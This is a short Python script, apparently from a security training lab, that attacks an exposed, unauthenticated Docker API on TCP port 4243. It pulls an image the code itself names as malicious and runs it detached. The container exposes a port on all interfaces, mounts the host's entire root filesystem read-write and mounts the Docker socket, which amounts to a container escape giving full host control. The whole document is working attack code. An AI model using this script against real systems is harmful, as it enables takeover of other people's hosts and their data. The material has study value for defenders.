import docker
client = docker.DockerClient(base_url='tcp://127.0.0.1:4243')

malicious_image = 'we45/docker-ui:latest'
client.images.pull(malicious_image)
port_key = {"{0}/tcp".format(6080): ('0.0.0.0', 6080)}

client.containers.run(image=malicious_image, ports=port_key, volumes={'/': {'bind': '/rootFS/', 'mode': 'rw'}, '/var/run/docker.sock': {'bind': '/var/run/docker.sock', 'mode': 'rw'}}, detach=True)
